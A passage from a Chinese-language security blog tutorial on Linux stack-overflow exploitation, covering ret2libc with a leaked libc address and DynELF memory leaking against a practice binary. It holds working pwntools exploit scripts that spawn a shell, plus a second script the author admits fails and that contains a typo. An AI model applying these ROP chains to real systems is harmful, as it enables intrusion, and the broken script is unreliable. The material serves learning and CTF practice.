08    	jmp    *0x804a00c</span><br><span class="line"> 8048436:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 804843b:	e9 e0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048440 &lt;gets@plt&gt;:</span><br><span class="line"> 8048440:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 8048446:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 804844b:	e9 d0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048450 &lt;time@plt&gt;:</span><br><span class="line"> 8048450:	ff 25 14 a0 04 08    	jmp    *0x804a014</span><br><span class="line"> 8048456:	68 10 00 00 00       	push   $0x10</span><br><span class="line"> 804845b:	e9 c0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048460 &lt;puts@plt&gt;:</span><br><span class="line"> 8048460:	ff 25 18 a0 04 08    	jmp    *0x804a018</span><br><span class="line"> 8048466:	68 18 00 00 00       	push   $0x18</span><br><span class="line"> 804846b:	e9 b0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048470 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 8048470:	ff 25 1c a0 04 08    	jmp    *0x804a01c</span><br><span class="line"> 8048476:	68 20 00 00 00       	push   $0x20</span><br><span class="line"> 804847b:	e9 a0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048480 &lt;srand@plt&gt;:</span><br><span class="line"> 8048480:	ff 25 20 a0 04 08    	jmp    *0x804a020</span><br><span class="line"> 8048486:	68 28 00 00 00       	push   $0x28</span><br><span class="line"> 804848b:	e9 90 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048490 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 8048490:	ff 25 24 a0 04 08    	jmp    *0x804a024</span><br><span class="line"> 8048496:	68 30 00 00 00       	push   $0x30</span><br><span class="line"> 804849b:	e9 80 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080484a0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80484a0:	ff 25 28 a0 04 08    	jmp    *0x804a028</span><br><span class="line"> 80484a6:	68 38 00 00 00       	push   $0x38</span><br><span class="line"> 80484ab:	e9 70 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080484b0 &lt;rand@plt&gt;:</span><br><span class="line"> 80484b0:	ff 25 2c a0 04 08    	jmp    *0x804a02c</span><br><span class="line"> 80484b6:	68 40 00 00 00       	push   $0x40</span><br><span class="line"> 80484bb:	e9 60 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080484c0 &lt;__isoc99_scanf@plt&gt;:</span><br><span class="line"> 80484c0:	ff 25 30 a0 04 08    	jmp    *0x804a030</span><br><span class="line"> 80484c6:	68 48 00 00 00       	push   $0x48</span><br><span class="line"> 80484cb:	e9 50 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ objdump  -R ret2libc3</span><br><span class="line"></span><br><span class="line">ret2libc3:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE</span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a040 R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a060 R_386_COPY        stdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   time@GLIBC_2.0</span><br><span class="line">0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a020 R_386_JUMP_SLOT   srand@GLIBC_2.0</span><br><span class="line">0804a024 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a028 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</span><br><span class="line">0804a02c R_386_JUMP_SLOT   rand@GLIBC_2.0</span><br><span class="line">0804a030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure></p>
+<p>思路：通过puts@plt打印出<strong>libc_start_main在内存中的地址，也就是</strong>libc_start_main@got。<br>既然puts()函数实现是在libc.so当中，那我们调用的puts@plt()函数为什么也能实现puts()功能呢? 这是因为linux采用了<strong>延时绑定技术</strong>，当我们调用puts@plt()的时候，系统会将真正的puts()函数地址link到got表的puts.got中，然后puts@plt()会根据puts.got 跳转到真正的puts()函数上去。<br>由于 libc 的延迟绑定机制，我们需要泄漏<strong>已经执行过的函数的地址</strong>。这里我们泄露 libc_start_main 的地址，这是因为它是程序<strong>最初被执行</strong>的地方。</p>
+<p>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ldd ret2libc3</span><br><span class="line">	linux-gate.so.1 (0xf7f6b000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d74000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f6d000)</span><br><span class="line"></span><br><span class="line">han at ubuntu in ~/ck/pwn/linux/ret2libc</span><br><span class="line">$ cp /lib32/libc.so.6  libc.so</span><br></pre></td></tr></table></figure></p>
+<h3 id="pwn测试-3"><a href="#pwn测试-3" class="headerlink" title="pwn测试"></a>pwn测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">libc_start_main_got =elf.got[&apos;__libc_start_main&apos;]</span><br><span class="line">main = elf.symbols[&apos;main&apos;]</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = flat([&apos;a&apos;*112],puts_plt,main,libc_start_main_got)</span><br><span class="line">p.sendlineafter(&apos;Can you find it !?&apos;,payload)</span><br><span class="line"></span><br><span class="line">print(&quot;receiving libc_start_main_got&quot;)</span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line">print(&apos;libc_start_main_addr = &apos; + hex(libc_start_main_addr))</span><br><span class="line"></span><br><span class="line">print(&quot;calculating system() addr and \&quot;/bin/sh\&quot; addr&quot;)</span><br><span class="line">system_addr = libc_start_main_addr + (libc.symbols[&apos;system&apos;]-libc.symbols[&apos;__libc_start_main&apos;])</span><br><span class="line">print(&apos;system_addr= &apos; + hex(system_addr))</span><br><span class="line">binsh_addr = libc_start_main_addr + (next(libc.search(&apos;/bin/sh&apos;))-libc.symbols[&apos;__libc_start_main&apos;])</span><br><span class="line">print(&apos;binsh_addr= &apos; + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line"></span><br><span class="line">print(p32(system_addr),p32(binsh_addr))</span><br><span class="line">payload = flat([&apos;a&apos;*104,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ol>
+<li>ELF模块<br>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。<br>下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">&gt; &gt;&gt;&gt; print hex(e.address)  # 文件装载的基地址</span><br><span class="line">&gt; 0x400000</span><br><span class="line">&gt; &gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址</span><br><span class="line">&gt; 0x401680</span><br><span class="line">&gt; &gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址</span><br><span class="line">&gt; 0x60b070</span><br><span class="line">&gt; &gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址</span><br><span class="line">&gt; 0x401680</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</blockquote>
+<p>如果无法直接知道对方所使用的操作系统及libc的版本而苦恼，常规方法就是挨个把常见的Libc.so从系统里拿出来，与泄露的地址对比一下最后12位，从而获取版本<br>github上面有个库可以参考：<br><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span><br><span class="line">obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)</span><br><span class="line"></span><br><span class="line">obj.dump(&quot;system&quot;)        #system 偏移</span><br><span class="line">obj.dump(&quot;str_bin_sh&quot;)    #/bin/sh 偏移</span><br><span class="line">obj.dump(&quot;__libc_start_main_ret&quot;)</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h1 id="0x05-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击"><a href="#0x05-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击" class="headerlink" title="0x05 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击"></a>0x05 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击</h1><p>参考的是蒸米的exp，但是用的不是他的示例程序，而是ret2libc3。<br>他的方法是通过write@plt泄露内存，然后寻找system函数。然后使用read@plt将’/bin/sh’写入.bss段，然后通过pppr移交控制权给system()<br>ret2libc3的不同之处在于，没有write和read，不过没有关系，使用puts@plt和gets@plt也可以实现嘛，但是难就难在，虽然puts@plt只有一个参数，但是它有着遇到’\x00’就截断并在后面填充’\n’的“好”习惯，所以泄露出来的数据还需要处理。可以参考下面这两篇：<br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a><br><a href="http://uprprc.club/2016/09/07/pwntools-dynelf.html" target="_blank" rel="noopener">http://uprprc.club/2016/09/07/pwntools-dynelf.html</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">plt_puts = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">plt_gets = elf.symbols[<span class="string">'gets'</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> i</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    x = p.recvuntil(<span class="string">'!?'</span>)</span><br><span class="line">    payload1 = <span class="string">'\x90'</span>*<span class="number">112</span> + p32(plt_puts) + p32(main) + p32(address)</span><br><span class="line">    p.sendline(payload1)</span><br><span class="line">    up = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">          c = p.recv(<span class="number">1</span>)</span><br><span class="line">          count += <span class="number">1</span></span><br><span class="line">          <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">'N'</span>:</span><br><span class="line">                 print((content).encode(<span class="string">'hex'</span>))</span><br><span class="line">                 content =content[:<span class="number">-1</span>]+<span class="string">'\x00'</span></span><br><span class="line">                 <span class="keyword">break</span></span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">                 content += c</span><br><span class="line">                 up = c</span><br><span class="line">    content = content[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># content = p.recvuntil('\nN',True)</span></span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    <span class="comment"># if not content:</span></span><br><span class="line">    <span class="comment">#     content = '\x00'</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="comment">#     content = content[:4]</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"%#x =&gt; %s"</span> %(address, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = ELF(<span class="string">'./ret2libc3'</span>))</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">print(<span class="string">"system address = "</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">pr = <span class="number">0x0804841d</span></span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">'a'</span>*<span class="number">112</span>,plt_gets,pr,bss_addr,sytem_addr,main,bss_addr])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"###sending payload2####"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这段代码在泄露第一个数据之后就失败了，我调试了好久，最后才想起来，<code>payload1 = &#39;\x90&#39;*112 + p32(plt_puts) + p32(main) + p32(address)</code>这里如果使用的是main，那么堆栈就会不平衡，导致溢出点变化（参见之前从112变成104）。但是如果改成返回到start_addr，泄露的数据就会更多（虽然还是没有成功）。<br>一个事实是汇编程序的入口是_start，而C程序的入口是main函数</p>
+<blockquote>
+<p>执行的流程是：<br>GCC将你的程序同crtbegin.o/crtend.o/gcrt1.o一块进行编译。其它默认libraries会被默认动态链接。可执行程序的开始地址被设置为_start。<br>内核加载可执行文件，并且建立正文段，数据段，bss段和堆栈段，特别的，内核为参数和环境变量分配页面，并且将所有必要信息push到堆栈上。<br>控制流程到了_start上面。_start从内核建立的堆栈上获取所有信息，为<strong>libc_start_main建立参数栈，并且调用</strong>libc_start_main。<br><strong>libc_start_main初始化一些必要的东西，特别是C library（比如malloc)线程环境并且调用我们的main函数。<br>我们的main会以main(argv,argv)来被调用。事实上，这里有意思的一点是main函数的签名。</strong>libc_start_main认为main的签名为main(int, char , char )，如果你感到好奇，尝试执行下面的程序。<br><a href="https://www.mi1k7ea.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechatpay.png" alt="Cool-Y 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/Alipay.png" alt="Cool-Y 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/linux/" rel="tag"># linux</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/10/x86basic/" rel="next" title="x86-basic 漏洞利用">
+                <i class="fa fa-chevron-left"></i> x86-basic 漏洞利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Cool-Y">
+            
+              <p class="site-author-name" itemprop="name">Cool-Y</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Cool-Y" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:cool.yim@whu.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.instagram.com/yan__han/" target="_blank" title="Instagram">
+                      
+                        <i class="fa fa-fw fa-instagram"></i>Instagram</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-Control-Flow-hijack"><span class="nav-text">0x00 Control Flow hijack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找危险函数"><span class="nav-text">寻找危险函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计算溢出点的位置"><span class="nav-text">计算溢出点的位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#劫持ret的地址"><span class="nav-text">劫持ret的地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn测试"><span class="nav-text">pwn测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0X01-ret2shellcode"><span class="nav-text">0X01 ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护情况"><span class="nav-text">检查保护情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看危险函数"><span class="nav-text">查看危险函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计算溢出点"><span class="nav-text">计算溢出点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#劫持ret的地址-1"><span class="nav-text">劫持ret的地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn测试-1"><span class="nav-text">pwn测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-ret2text"><span class="nav-text">0x02 ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-1"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护"><span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检查危险函数"><span class="nav-text">检查危险函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计算偏移"><span class="nav-text">计算偏移</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找跳板"><span class="nav-text">寻找跳板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-ret2syscall"><span class="nav-text">0x03 ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-2"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取跳板"><span class="nav-text">获取跳板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试-1"><span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-ret2libc"><span class="nav-text">0x04 ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-3"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-程序中有system和’-bin-sh’"><span class="nav-text">1. 程序中有system和’/bin/sh’</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检查保护-1"><span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定漏洞位置"><span class="nav-text">确定漏洞位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计算偏移-1"><span class="nav-text">计算偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找跳板-1"><span class="nav-text">寻找跳板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn测试-2"><span class="nav-text">pwn测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-没有binsh"><span class="nav-text">2. 没有binsh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-两个都没有-amp-无ASLR"><span class="nav-text">3. 两个都没有&amp;无ASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找跳板-2"><span class="nav-text">寻找跳板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试-2"><span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-两个都没有-amp-有ASLR"><span class="nav-text">4. 两个都没有&amp;有ASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn测试-3"><span class="nav-text">pwn测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击"><span class="nav-text">0x05 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cool-Y</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="Site words total count">56.4k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
